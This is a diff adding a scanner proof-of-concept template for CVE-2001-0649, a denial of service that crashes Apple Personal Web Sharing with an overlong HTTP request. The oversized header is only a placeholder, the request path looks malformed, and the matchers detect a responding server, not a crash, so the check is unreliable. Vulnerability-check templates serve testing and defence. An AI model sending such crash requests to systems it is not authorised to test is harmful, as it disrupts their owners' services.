@@ -1,0 +1,52 @@
+[info]
+author = "ave"
+description = "验证 Apple Personal Web Sharing 1.1/1.5/1.5.5 是否存在远程拒绝服务漏洞，通过发送超长 HTTP 请求触发服务崩溃"
+id = "POC-AVE-2001-0278"
+name = "Apple Personal Web Sharing 远程拒绝服务漏洞 PoC (CVE-2001-0649)"
+severity = "medium"
+tags = ["ave-2001-0278"]
+vuln_id = [
+    "CVE-2001-0649",
+    "AVE-2001-0278",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+GET / HTTP/1.1\r
+Host: {{Hostname}}\r
+{{LongHeader}}\r
+\r
+"""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    500,
+    502,
+    503,
+    504,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = [
+    "Server:",
+    "Apache",
+    "Apple",
+]
